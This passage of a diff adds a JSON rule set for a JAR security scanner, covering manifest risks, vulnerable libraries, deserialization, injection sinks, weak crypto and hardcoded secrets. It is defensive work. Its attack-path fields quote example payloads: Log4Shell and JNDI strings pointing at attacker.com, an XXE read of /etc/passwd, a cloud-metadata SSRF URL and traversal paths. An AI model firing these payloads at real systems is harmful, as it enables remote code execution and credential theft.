@@ -1,0 +1,900 @@
+{
+  "schema_version": "1.0.0",
+  "name": "JAR Security Patterns",
+  "platform": "jar",
+  "patterns": [
+
+    {
+      "id": "jar-manifest-all-permissions",
+      "title": "JAR Manifest: All-Permissions Requested",
+      "severity": "High",
+      "category": "Manifest Security",
+      "enabled": true,
+      "description": "The JAR manifest requests 'all-permissions' which grants full access to the system when executed with a security manager. Attackers can abuse this to escape the sandbox.",
+      "attack_path": "Malicious or compromised JAR runs with unrestricted OS access, enabling file read/write, network connections, and process execution.",
+      "remediation": "Request only the specific permissions your application requires. Avoid 'all-permissions' in production JARs.",
+      "cwe": ["CWE-250"],
+      "references": ["https://docs.oracle.com/javase/8/docs/technotes/guides/security/permissions.html"],
+      "tags": ["manifest", "permissions", "sandbox-escape"],
+      "detection": {
+        "type": "manifest_attr",
+        "attribute": "Permissions",
+        "check": "equals",
+        "value": "all-permissions"
+      }
+    },
+
+    {
+      "id": "jar-manifest-agent-class",
+      "title": "JAR Manifest: Java Agent (Agent-Class)",
+      "severity": "High",
+      "category": "Manifest Security",
+      "enabled": true,
+      "description": "The manifest declares an Agent-Class, allowing this JAR to be loaded as a Java agent via -javaagent flag. Agents can instrument bytecode, intercept method calls, and modify running JVM state.",
+      "attack_path": "A malicious agent can rewrite class bytecode at load time, bypass authentication checks, exfiltrate secrets, or install backdoors invisibly.",
+      "remediation": "Only ship agent JARs intentionally. Verify any -javaagent JARs in your deployment. Sign and verify agent JARs before use.",
+      "cwe": ["CWE-284"],
+      "references": ["https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html"],
+      "tags": ["manifest", "agent", "bytecode-instrumentation"],
+      "detection": {
+        "type": "manifest_attr",
+        "attribute": "Agent-Class",
+        "check": "not_empty"
+      }
+    },
+
+    {
+      "id": "jar-manifest-premain-class",
+      "title": "JAR Manifest: Java Agent (Premain-Class)",
+      "severity": "High",
+      "category": "Manifest Security",
+      "enabled": true,
+      "description": "The manifest declares a Premain-Class, marking this JAR as a Java agent that runs before the main application. This allows full bytecode transformation and runtime monitoring.",
+      "attack_path": "Premain agents execute before any application code, enabling credential interception, SSL stripping, or silent backdoor installation.",
+      "remediation": "Audit any JAR declaring Premain-Class. Ensure it comes from a trusted, verified source.",
+      "cwe": ["CWE-284"],
+      "references": ["https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/Instrumentation.html"],
+      "tags": ["manifest", "agent", "premain"],
+      "detection": {
+        "type": "manifest_attr",
+        "attribute": "Premain-Class",
+        "check": "not_empty"
+      }
+    },
+
+    {
+      "id": "jar-manifest-classpath-url",
+      "title": "JAR Manifest: External Class-Path URL",
+      "severity": "Medium",
+      "category": "Manifest Security",
+      "enabled": true,
+      "description": "The MANIFEST.MF Class-Path attribute references an external URL or absolute path. This can cause the JVM to load classes from untrusted remote locations.",
+      "attack_path": "An attacker who controls the referenced URL can serve malicious classes that execute in the context of the loading application.",
+      "remediation": "Use only relative Class-Path entries pointing to local JARs. Never reference remote URLs in MANIFEST.MF.",
+      "cwe": ["CWE-829"],
+      "references": ["https://docs.oracle.com/javase/tutorial/deployment/jar/manifestindex.html"],
+      "tags": ["manifest", "classpath", "remote-code-loading"],
+      "detection": {
+        "type": "manifest_attr",
+        "attribute": "Class-Path",
+        "check": "regex",
+        "value": "https?://|ftp://|file:///|^/"
+      }
+    },
+
+    {
+      "id": "jar-manifest-trusted-library",
+      "title": "JAR Manifest: Trusted-Library Flag",
+      "severity": "Medium",
+      "category": "Manifest Security",
+      "enabled": true,
+      "description": "The JAR manifest sets Trusted-Library: true, which in older JVM sandbox environments grants elevated trust to code in this JAR.",
+      "attack_path": "Abused to bypass legacy applet/JNLP sandboxing and gain access to privileged APIs.",
+      "remediation": "Remove Trusted-Library unless explicitly required by a legacy deployment model.",
+      "cwe": ["CWE-250"],
+      "references": [],
+      "tags": ["manifest", "trusted-library", "sandbox"],
+      "detection": {
+        "type": "manifest_attr",
+        "attribute": "Trusted-Library",
+        "check": "equals",
+        "value": "true"
+      }
+    },
+
+    {
+      "id": "jar-manifest-can-redefine-classes",
+      "title": "JAR Manifest: Can-Redefine-Classes",
+      "severity": "Medium",
+      "category": "Manifest Security",
+      "enabled": true,
+      "description": "The agent manifest requests Can-Redefine-Classes: true, allowing it to replace class definitions at runtime with arbitrary bytecode.",
+      "attack_path": "An agent with class redefinition capability can silently replace security-critical classes (e.g., authentication logic) with backdoored versions.",
+      "remediation": "Only grant Can-Redefine-Classes to agents that genuinely require it. Verify agent integrity before deployment.",
+      "cwe": ["CWE-284"],
+      "references": [],
+      "tags": ["manifest", "agent", "class-redefinition"],
+      "detection": {
+        "type": "manifest_attr",
+        "attribute": "Can-Redefine-Classes",
+        "check": "equals",
+        "value": "true"
+      }
+    },
+
+    {
+      "id": "jar-log4shell-class",
+      "title": "Log4Shell Vulnerable Class (CVE-2021-44228)",
+      "severity": "Critical",
+      "category": "Known Vulnerable Library",
+      "enabled": true,
+      "description": "The JAR contains JndiLookup.class from log4j-core, the class responsible for Log4Shell (CVE-2021-44228). An attacker who can control logged input can trigger remote code execution via JNDI.",
+      "attack_path": "Attacker sends ${jndi:ldap://attacker.com/a} in any logged field. Log4j fetches and executes a remote class, achieving unauthenticated RCE.",
+      "remediation": "Upgrade log4j-core to >= 2.17.1 (Java 8) / >= 2.12.4 (Java 7). As a workaround, delete JndiLookup.class from the JAR.",
+      "cwe": ["CWE-917", "CWE-20"],
+      "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228", "https://logging.apache.org/log4j/2.x/security.html"],
+      "tags": ["log4j", "log4shell", "jndi", "rce", "cve-2021-44228"],
+      "detection": {
+        "type": "class_exists",
+        "class_name": "org/apache/logging/log4j/core/lookup/JndiLookup"
+      }
+    },
+
+    {
+      "id": "jar-log4shell-version",
+      "title": "Log4j-Core Vulnerable Version (Log4Shell)",
+      "severity": "Critical",
+      "category": "Known Vulnerable Library",
+      "enabled": true,
+      "description": "A vulnerable version of log4j-core (< 2.15.0) is bundled. All versions from 2.0-beta9 through 2.14.1 are affected by Log4Shell (CVE-2021-44228).",
+      "attack_path": "Any log statement processing attacker-controlled input can trigger JNDI lookup leading to RCE.",
+      "remediation": "Upgrade to log4j-core >= 2.17.1. Remove log4j-core entirely if logging can be replaced.",
+      "cwe": ["CWE-917"],
+      "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],
+      "tags": ["log4j", "log4shell", "cve-2021-44228"],
+      "detection": {
+        "type": "library_version",
+        "name_pattern": "log4j-core-(1\\.|2\\.(0\\.|1[0-4]\\.|15\\.))"
+      }
+    },
+
+    {
+      "id": "jar-commons-collections-gadget",
+      "title": "Commons Collections Deserialization Gadget (CVE-2015-4852)",
+      "severity": "Critical",
+      "category": "Known Vulnerable Library",
+      "enabled": true,
+      "description": "InvokerTransformer from Apache Commons Collections is present. This class is the key component in the most widely exploited Java deserialization gadget chains, enabling RCE via ObjectInputStream.readObject().",
+      "attack_path": "Attacker sends a crafted serialized payload to any endpoint that calls ObjectInputStream.readObject(). The InvokerTransformer chain executes arbitrary system commands.",
+      "remediation": "Upgrade commons-collections to >= 3.2.2 or >= 4.1. Implement a deserialization filter (Java 9+) or use SerialKiller/NotSoSerial.",
+      "cwe": ["CWE-502"],
+      "references": ["https://nvd.nist.gov/vuln/detail/CVE-2015-4852", "https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/"],
+      "tags": ["commons-collections", "deserialization", "gadget-chain", "rce"],
+      "detection": {
+        "type": "class_exists",
+        "class_name": "org/apache/commons/collections/functors/InvokerTransformer"
+      }
+    },
+
+    {
+      "id": "jar-spring4shell-class",
+      "title": "Spring4Shell Vulnerable Class (CVE-2022-22965)",
+      "severity": "Critical",
+      "category": "Known Vulnerable Library",
+      "enabled": true,
+      "description": "The JAR contains Spring Framework's DataBinder class. Combined with Spring MVC on JDK 9+, this is the entry point for Spring4Shell (CVE-2022-22965) — a critical RCE via data binding.",
+      "attack_path": "Attacker sends specially crafted HTTP request parameters that exploit ClassLoader data binding, writing a JSP web shell to the server.",
+      "remediation": "Upgrade spring-webmvc/spring-beans to >= 5.3.18 or >= 5.2.20. Apply CVE-2022-22965 patch.",
+      "cwe": ["CWE-94"],
+      "references": ["https://nvd.nist.gov/vuln/detail/CVE-2022-22965", "https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement"],
+      "tags": ["spring", "spring4shell", "cve-2022-22965", "rce"],
+      "detection": {
+        "type": "library_version",
+        "name_pattern": "spring-(webmvc|beans|core)-(5\\.(0\\.|1\\.|2\\.([01]|[0-9]\\.|1[0-9]\\.)|3\\.(0\\.|1[0-7]\\.)))"
+      }
+    },
+
+    {
+      "id": "jar-jackson-databind-vulnerable",
+      "title": "Jackson-Databind Vulnerable Version (Polymorphic Deserialization)",
+      "severity": "High",
+      "category": "Known Vulnerable Library",
+      "enabled": true,
+      "description": "A vulnerable version of jackson-databind is bundled. Versions before 2.13.4.1 with enableDefaultTyping() or @JsonTypeInfo are susceptible to polymorphic deserialization RCE (multiple CVEs).",
+      "attack_path": "Attacker sends crafted JSON with type hints to a deserializing endpoint, triggering gadget chain execution via JNDI, JDBC URL, or other sinks.",
+      "remediation": "Upgrade to jackson-databind >= 2.14.0. Disable default typing. Use allowlist-based type resolution.",
+      "cwe": ["CWE-502"],
+      "references": ["https://nvd.nist.gov/vuln/detail/CVE-2020-36518", "https://github.com/FasterXML/jackson-databind"],
+      "tags": ["jackson", "deserialization", "json", "cve-2020-36518"],
+      "detection": {
+        "type": "library_version",
+        "name_pattern": "jackson-databind-(1\\.|2\\.([0-9]\\.|1[0-2]\\.|13\\.[0-3]\\.))"
+      }
+    },
+
+    {
+      "id": "jar-xstream-vulnerable",
+      "title": "XStream Vulnerable Version (CVE-2021-29505 / CVE-2022-40151)",
+      "severity": "High",
+      "category": "Known Vulnerable Library",
+      "enabled": true,
+      "description": "A vulnerable version of XStream (< 1.4.20) is bundled. XStream has a history of critical deserialization vulnerabilities allowing RCE via crafted XML.",
+      "attack_path": "Attacker sends malicious XML to any XStream.fromXML() endpoint. Pre-1.4.17 versions have no built-in security framework and allow arbitrary class instantiation.",
+      "remediation": "Upgrade XStream to >= 1.4.20. Enable XStream's security framework with an allowlist of permitted types.",
+      "cwe": ["CWE-502"],
+      "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-29505", "https://x-stream.github.io/security.html"],
+      "tags": ["xstream", "deserialization", "xml", "rce"],
+      "detection": {
+        "type": "library_version",
+        "name_pattern": "xstream-(1\\.(1|2|3|4\\.(0|1|[2-9]|1[0-9])\\.)|0\\.)"
+      }
+    },
+
+    {
+      "id": "jar-snakeyaml-vulnerable",
+      "title": "SnakeYAML Vulnerable Version (CVE-2022-1471)",
+      "severity": "High",
+      "category": "Known Vulnerable Library",
+      "enabled": true,
+      "description": "SnakeYAML < 2.0 is present. CVE-2022-1471 allows RCE when untrusted YAML is parsed with the default Constructor, enabling arbitrary Java class instantiation.",
+      "attack_path": "Attacker sends a YAML payload with !!javax.script.ScriptEngineManager or similar to trigger class instantiation and code execution.",
+      "remediation": "Upgrade SnakeYAML to >= 2.0. Use SafeConstructor for untrusted input.",
+      "cwe": ["CWE-20"],
+      "references": ["https://nvd.nist.gov/vuln/detail/CVE-2022-1471"],
+      "tags": ["snakeyaml", "yaml", "deserialization", "cve-2022-1471"],
+      "detection": {
+        "type": "library_version",
+        "name_pattern": "snakeyaml-(1\\.|0\\.)"
+      }
+    },
+
+    {
+      "id": "jar-deserialize-objectinputstream",
+      "title": "Java Deserialization: ObjectInputStream.readObject()",
+      "severity": "High",
+      "category": "Deserialization",
+      "enabled": true,
+      "description": "The code calls ObjectInputStream.readObject() which deserializes untrusted Java object streams. Combined with gadget-chain libraries on the classpath, this enables remote code execution.",
+      "attack_path": "Attacker sends a serialized payload to any endpoint reading from an ObjectInputStream. Gadget chains (e.g., Commons Collections, Spring) execute arbitrary commands.",
+      "remediation": "Implement a deserialization filter (Java 9+ ObjectInputFilter) with an explicit allowlist. Use JSON/Protobuf instead of Java serialization for external data.",
+      "cwe": ["CWE-502"],
+      "references": ["https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data"],
+      "tags": ["deserialization", "objectinputstream", "rce"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "ObjectInputStream|readObject\\(\\)|readUnshared\\(\\)"
+      }
+    },
+
+    {
+      "id": "jar-deserialize-xmldecoder",
+      "title": "XMLDecoder Deserialization",
+      "severity": "High",
+      "category": "Deserialization",
+      "enabled": true,
+      "description": "java.beans.XMLDecoder is used to deserialize XML. XMLDecoder can instantiate arbitrary Java objects and is equivalent to Java serialization for attack purposes.",
+      "attack_path": "Attacker provides XML like <object class='java.lang.Runtime'><void method='exec'><array>...</array></void></object> to execute commands.",
+      "remediation": "Do not deserialize untrusted XML with XMLDecoder. Use a restricted XML parser or a safe data format (JSON, Protobuf).",
+      "cwe": ["CWE-502"],
+      "references": ["https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"],
+      "tags": ["deserialization", "xmldecoder", "rce"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "XMLDecoder|new XMLDecoder"
+      }
+    },
+
+    {
+      "id": "jar-deserialize-kryo-unsafe",
+      "title": "Kryo Deserialization Without Registration",
+      "severity": "Medium",
+      "category": "Deserialization",
+      "enabled": true,
+      "description": "Kryo serialization is used. When setRegistrationRequired(false) is set, Kryo can instantiate arbitrary classes from serialized data, similar to Java Object deserialization attacks.",
+      "attack_path": "If deserialization input is attacker-controlled and registration is not required, an attacker can provide payloads that instantiate dangerous classes.",
+      "remediation": "Set kryo.setRegistrationRequired(true) and register only the classes your application needs.",
+      "cwe": ["CWE-502"],
+      "references": ["https://github.com/EsotericSoftware/kryo"],
+      "tags": ["kryo", "deserialization"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "setRegistrationRequired\\s*\\(\\s*false"
+      }
+    },
+
+    {
+      "id": "jar-code-injection-runtime-exec",
+      "title": "OS Command Injection: Runtime.exec() / ProcessBuilder",
+      "severity": "High",
+      "category": "Code Injection",
+      "enabled": true,
+      "description": "The code uses Runtime.exec() or ProcessBuilder to execute OS commands. If the command or arguments include unsanitized user input, this leads to OS command injection.",
+      "attack_path": "Attacker injects shell metacharacters (;, &&, |, $()) into user-controlled input that flows into exec() arguments, executing arbitrary system commands.",
+      "remediation": "Never pass user input directly to Runtime.exec() or ProcessBuilder. Validate and sanitize all inputs. Prefer high-level APIs over shell commands.",
+      "cwe": ["CWE-78"],
+      "references": ["https://owasp.org/www-community/attacks/Command_Injection"],
+      "tags": ["command-injection", "runtime-exec", "os-command"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "Runtime\\.getRuntime\\(\\)\\.exec|new ProcessBuilder|ProcessBuilder\\("
+      }
+    },
+
+    {
+      "id": "jar-code-injection-jndi",
+      "title": "JNDI Lookup — Potential Injection Sink",
+      "severity": "High",
+      "category": "Code Injection",
+      "enabled": true,
+      "description": "JNDI InitialContext.lookup() is called. If the lookup name includes user-controlled data, attackers can redirect the lookup to a malicious LDAP/RMI server to load remote classes (as in Log4Shell).",
+      "attack_path": "Attacker provides a JNDI URL such as ldap://attacker.com/Evil to a lookup(), which fetches and instantiates a remote class executing arbitrary code.",
+      "remediation": "Never use user-controlled data in JNDI lookup names. Disable JNDI remote class loading via com.sun.jndi.ldap.object.trustURLCodebase=false (Java 8u191+).",
+      "cwe": ["CWE-74"],
+      "references": ["https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf"],
+      "tags": ["jndi", "ldap", "rmi", "rce"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "InitialContext|new InitialContext|context\\.lookup|jndi:|ldap://|rmi://"
+      }
+    },
+
+    {
+      "id": "jar-code-injection-scriptengine",
+      "title": "Dynamic Script Execution: ScriptEngine.eval()",
+      "severity": "High",
+      "category": "Code Injection",
+      "enabled": true,
+      "description": "javax.script.ScriptEngine.eval() executes JavaScript or other scripting languages at runtime. If the script content is user-controlled, this is a direct code injection vulnerability.",
+      "attack_path": "Attacker provides malicious script code that calls Java methods, reads files, or executes system commands via the Nashorn/Rhino engine.",
+      "remediation": "Never eval() user-controlled content. If scripting is needed, use a sandboxed engine with a restricted ClassShutter/AccessControlContext.",
+      "cwe": ["CWE-94"],
+      "references": ["https://owasp.org/www-community/attacks/Direct_Dynamic_Code_Evaluation_Eval_Injection"],
+      "tags": ["scriptengine", "eval", "code-injection"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "ScriptEngineManager|scriptEngine\\.eval|engine\\.eval|NashornScriptEngine"
+      }
+    },
+
+    {
+      "id": "jar-code-injection-reflection",
+      "title": "Unsafe Reflection: Class.forName() / getDeclaredMethod()",
+      "severity": "Medium",
+      "category": "Code Injection",
+      "enabled": true,
+      "description": "The code uses Class.forName() or reflection to dynamically load and invoke classes. If the class name or method is user-controlled, this enables arbitrary code execution.",
+      "attack_path": "Attacker supplies a class name string that loads a dangerous class (e.g., Runtime, ProcessBuilder) and invokes exec() through reflection.",
+      "remediation": "Validate class names against a strict allowlist before using Class.forName(). Avoid reflective invocation with user-controlled method names.",
+      "cwe": ["CWE-470"],
+      "references": ["https://owasp.org/www-community/attacks/Reflection_injection"],
+      "tags": ["reflection", "class-forname", "code-injection"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "Class\\.forName\\s*\\(|getDeclaredMethod|getDeclaredField|setAccessible\\s*\\(\\s*true"
+      }
+    },
+
+    {
+      "id": "jar-code-injection-urlclassloader",
+      "title": "Dynamic Class Loading: URLClassLoader",
+      "severity": "High",
+      "category": "Code Injection",
+      "enabled": true,
+      "description": "URLClassLoader is used to load classes from arbitrary URLs at runtime. If the URL is user-controlled, an attacker can serve and execute malicious classes.",
+      "attack_path": "Attacker provides a URL pointing to a remote JAR containing a malicious class. URLClassLoader fetches and loads it, executing attacker code.",
+      "remediation": "Avoid URLClassLoader with external URLs. If needed, verify the URL against a strict allowlist and validate code signatures.",
+      "cwe": ["CWE-829"],
+      "references": [],
+      "tags": ["urlclassloader", "remote-code-loading", "rce"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "new URLClassLoader|URLClassLoader\\("
+      }
+    },
+
+    {
+      "id": "jar-crypto-weak-md5",
+      "title": "Weak Hash Algorithm: MD5",
+      "severity": "Medium",
+      "category": "Cryptography",
+      "enabled": true,
+      "description": "MD5 is used for hashing. MD5 is cryptographically broken and vulnerable to collision attacks. It must not be used for security-sensitive purposes such as password hashing, digital signatures, or integrity checks.",
+      "attack_path": "Collision attacks allow forging certificates, bypassing integrity checks, or cracking MD5-hashed passwords in seconds using rainbow tables.",
+      "remediation": "Replace MD5 with SHA-256 or SHA-3 for integrity checks. For passwords, use bcrypt, scrypt, or Argon2.",
+      "cwe": ["CWE-327"],
+      "references": ["https://owasp.org/www-community/vulnerabilities/Insufficient_Entropy"],
+      "tags": ["md5", "weak-hash", "crypto"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "MessageDigest\\.getInstance\\s*\\(\\s*[\"']MD5[\"']|DigestUtils\\.md5"
+      }
+    },
+
+    {
+      "id": "jar-crypto-weak-sha1",
+      "title": "Weak Hash Algorithm: SHA-1",
+      "severity": "Low",
+      "category": "Cryptography",
+      "enabled": true,
+      "description": "SHA-1 is used for hashing. SHA-1 is deprecated for security use due to demonstrated collision attacks (SHAttered). It should not be used for digital signatures or certificate verification.",
+      "attack_path": "SHA-1 collisions can be used to forge digital signatures, clone certificates, and bypass file integrity verification.",
+      "remediation": "Migrate to SHA-256 or SHA-3 for all new development. Existing uses should be audited for security context.",
+      "cwe": ["CWE-327"],
+      "references": ["https://shattered.io"],
+      "tags": ["sha1", "weak-hash", "crypto"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "MessageDigest\\.getInstance\\s*\\(\\s*[\"']SHA-?1[\"']|DigestUtils\\.sha1"
+      }
+    },
+
+    {
+      "id": "jar-crypto-des-3des",
+      "title": "Weak Cipher: DES / 3DES",
+      "severity": "High",
+      "category": "Cryptography",
+      "enabled": true,
+      "description": "DES or Triple-DES (3DES/TDEA) symmetric encryption is used. DES has a 56-bit key (trivially brute-forceable). 3DES is deprecated due to the Sweet32 birthday attack.",
+      "attack_path": "Brute-force or meet-in-the-middle attacks can decrypt DES-encrypted data. Sweet32 allows decryption of 3DES data in ~2^32 blocks.",
+      "remediation": "Replace with AES-256-GCM or ChaCha20-Poly1305.",
+      "cwe": ["CWE-326"],
+      "references": ["https://sweet32.info"],
+      "tags": ["des", "3des", "weak-cipher", "crypto"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "Cipher\\.getInstance\\s*\\(\\s*[\"'](DES|DESede|TripleDES|3DES)"
+      }
+    },
+
+    {
+      "id": "jar-crypto-ecb-mode",
+      "title": "Insecure Block Cipher Mode: ECB",
+      "severity": "High",
+      "category": "Cryptography",
+      "enabled": true,
+      "description": "AES or another cipher is used in ECB (Electronic Codebook) mode. ECB encrypts each block independently, making it deterministic and revealing plaintext patterns in the ciphertext.",
+      "attack_path": "ECB-encrypted images reveal the underlying structure (e.g., the 'ECB penguin'). Identical plaintext blocks produce identical ciphertext blocks, enabling pattern analysis and replay attacks.",
+      "remediation": "Use AES/GCM/NoPadding (AES-GCM) or AES/CBC/PKCS5Padding with a random IV.",
+      "cwe": ["CWE-327"],
+      "references": ["https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#ECB"],
+      "tags": ["ecb", "aes-ecb", "weak-cipher-mode", "crypto"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "Cipher\\.getInstance\\s*\\(\\s*[\"'][^\"']*/ECB/"
+      }
+    },
+
+    {
+      "id": "jar-crypto-hardcoded-key",
+      "title": "Hardcoded Cryptographic Key",
+      "severity": "Critical",
+      "category": "Cryptography",
+      "enabled": true,
+      "description": "A cryptographic key is hardcoded as a string literal or byte array. Anyone with access to the JAR can extract the key and decrypt all protected data.",
+      "attack_path": "Extract key from JAR using javap/decompiler. Use key to decrypt all encrypted data, forge authentication tokens, or sign malicious payloads.",
+      "remediation": "Never hardcode keys. Use a key management service (AWS KMS, HashiCorp Vault) or derive keys from a secure password using PBKDF2/Argon2.",
+      "cwe": ["CWE-321"],
+      "references": ["https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_cryptographic_key"],
+      "tags": ["hardcoded-key", "secretkeyspec", "crypto"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "new SecretKeySpec\\s*\\(|SecretKeyFactory|hardcoded.*key|private.*static.*final.*KEY"
+      }
+    },
+
+    {
+      "id": "jar-crypto-insecure-random",
+      "title": "Insecure Randomness: java.util.Random",
+      "severity": "Medium",
+      "category": "Cryptography",
+      "enabled": true,
+      "description": "java.util.Random is used where a cryptographically secure random number generator is needed. java.util.Random is predictable given a seed, making it unsuitable for security tokens, session IDs, or nonces.",
+      "attack_path": "Attacker observes a few Random outputs, predicts the seed, and predicts future tokens including session IDs, CSRF tokens, or password reset links.",
+      "remediation": "Use java.security.SecureRandom for all security-sensitive randomness.",
+      "cwe": ["CWE-330"],
+      "references": ["https://owasp.org/www-community/vulnerabilities/Insecure_Randomness"],
+      "tags": ["random", "insecure-random", "crypto"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "new java\\.util\\.Random\\(|new Random\\("
+      }
+    },
+
+    {
+      "id": "jar-input-sqli",
+      "title": "SQL Injection Risk: Statement Instead of PreparedStatement",
+      "severity": "High",
+      "category": "Input Validation",
+      "enabled": true,
+      "description": "The code executes SQL queries using Statement.executeQuery() or execute() with string concatenation instead of PreparedStatement. This is the classic SQL injection pattern.",
+      "attack_path": "Attacker injects SQL syntax into user input (e.g., ' OR 1=1 --), bypassing authentication, exfiltrating data, or executing admin operations.",
+      "remediation": "Always use PreparedStatement with parameterized queries. Never concatenate user input into SQL strings.",
+      "cwe": ["CWE-89"],
+      "references": ["https://owasp.org/www-community/attacks/SQL_Injection"],
+      "tags": ["sql-injection", "sqli", "statement"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "createStatement\\(\\)|stmt\\.execute\\(|statement\\.execute\\(|executeQuery\\s*\\(\\s*\\\".*\\+"
+      }
+    },
+
+    {
+      "id": "jar-input-xxe",
+      "title": "XML External Entity (XXE) Injection",
+      "severity": "High",
+      "category": "Input Validation",
+      "enabled": true,
+      "description": "DocumentBuilderFactory is used without disabling external entity processing. This enables XXE attacks that can read local files, perform SSRF, or cause DoS.",
+      "attack_path": "Attacker provides XML with <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>, causing the parser to read and return /etc/passwd.",
+      "remediation": "Set dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true) and dbf.setFeature('http://apache.org/xml/features/disallow-doctype-decl', true).",
+      "cwe": ["CWE-611"],
+      "references": ["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
+      "tags": ["xxe", "xml", "external-entity"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "DocumentBuilderFactory\\.newInstance|SAXParserFactory\\.newInstance|XMLInputFactory\\.newInstance"
+      }
+    },
+
+    {
+      "id": "jar-input-path-traversal",
+      "title": "Path Traversal Risk",
+      "severity": "High",
+      "category": "Input Validation",
+      "enabled": true,
+      "description": "File operations use paths derived from user input without canonicalization. Attackers can use ../ sequences to escape the intended directory and read/write arbitrary files.",
+      "attack_path": "Attacker sends filename=../../../../etc/passwd to read system files, or writes a web shell to a publicly accessible directory.",
+      "remediation": "Canonicalize paths with file.getCanonicalPath() and verify they start with the expected base directory before any file operation.",
+      "cwe": ["CWE-22"],
+      "references": ["https://owasp.org/www-community/attacks/Path_Traversal"],
+      "tags": ["path-traversal", "directory-traversal", "lfi"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "new File\\s*\\(|new FileInputStream|new FileOutputStream|Files\\.newInputStream|Files\\.newOutputStream"
+      }
+    },
+
+    {
+      "id": "jar-input-zip-slip",
+      "title": "Zip Slip Path Traversal (CVE-2018-1002200)",
+      "severity": "High",
+      "category": "Input Validation",
+      "enabled": true,
+      "description": "ZIP/archive extraction code uses ZipEntry.getName() without checking for path traversal. Zip Slip allows a malicious archive to write files outside the extraction directory.",
+      "attack_path": "Malicious archive contains entry '../../.bashrc' or '../../cron.d/backdoor'. Extraction writes these files to the parent filesystem, potentially achieving code execution.",
+      "remediation": "After calling ZipEntry.getName(), resolve it against the output directory and verify with canonicalization that the resolved path starts within the target directory.",
+      "cwe": ["CWE-22"],
+      "references": ["https://snyk.io/research/zip-slip-vulnerability", "https://nvd.nist.gov/vuln/detail/CVE-2018-1002200"],
+      "tags": ["zip-slip", "path-traversal", "archive-extraction"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "ZipEntry|ZipInputStream|entry\\.getName\\(\\)|zipEntry\\.getName"
+      }
+    },
+
+    {
+      "id": "jar-input-ssrf",
+      "title": "Server-Side Request Forgery (SSRF) Risk",
+      "severity": "High",
+      "category": "Input Validation",
+      "enabled": true,
+      "description": "The code opens connections to URLs that may be user-controlled. If the URL is not validated, an attacker can force the server to make requests to internal services, cloud metadata endpoints, or other restricted resources.",
+      "attack_path": "Attacker provides url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ to exfiltrate AWS credentials or scan internal network services.",
+      "remediation": "Validate URLs against an allowlist of permitted hosts/schemes. Block private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x). Use a dedicated SSRF protection library.",
+      "cwe": ["CWE-918"],
+      "references": ["https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery"],
+      "tags": ["ssrf", "url-fetch", "internal-network"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "new URL\\s*\\(|url\\.openConnection|HttpURLConnection|HttpClient\\.newHttpClient|OkHttpClient"
+      }
+    },
+
+    {
+      "id": "jar-secrets-aws-key",
+      "title": "Hardcoded AWS Access Key",
+      "severity": "Critical",
+      "category": "Sensitive Data",
+      "enabled": true,
+      "description": "An AWS Access Key ID (AKIA...) is hardcoded in the JAR's class files. Anyone with the JAR can extract this key and access AWS services.",
+      "attack_path": "Attacker decompiles JAR, extracts AKIA key and secret, authenticates to AWS CLI, and gains access to S3 buckets, EC2 instances, RDS databases, or other cloud resources.",
+      "remediation": "Remove hardcoded credentials. Use IAM instance roles, AWS SDK credential chain (environment variables, ~/.aws/credentials), or AWS Secrets Manager.",
+      "cwe": ["CWE-798"],
+      "references": ["https://docs.aws.amazon.com/general/latest/gr/aws-security-credentials.html"],
+      "tags": ["aws", "access-key", "hardcoded-secret", "credentials"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "AKIA[0-9A-Z]{16}"
+      }
+    },
+
+    {
+      "id": "jar-secrets-private-key",
+      "title": "Hardcoded Private Key Material",
+      "severity": "Critical",
+      "category": "Sensitive Data",
+      "enabled": true,
+      "description": "PEM-encoded private key material is hardcoded in the JAR. This exposes RSA/EC private keys used for TLS, code signing, or authentication.",
+      "attack_path": "Attacker extracts private key, impersonates the server in TLS connections, decrypts captured traffic, or forges code signatures.",
+      "remediation": "Never bundle private keys in distributed JARs. Store private keys in a keystore (PKCS#12/JKS) protected by a strong password, or use a HSM.",
+      "cwe": ["CWE-321"],
+      "references": [],
+      "tags": ["private-key", "pem", "rsa", "hardcoded-secret"],
+      "detection": {
+        "type": "string_pattern",
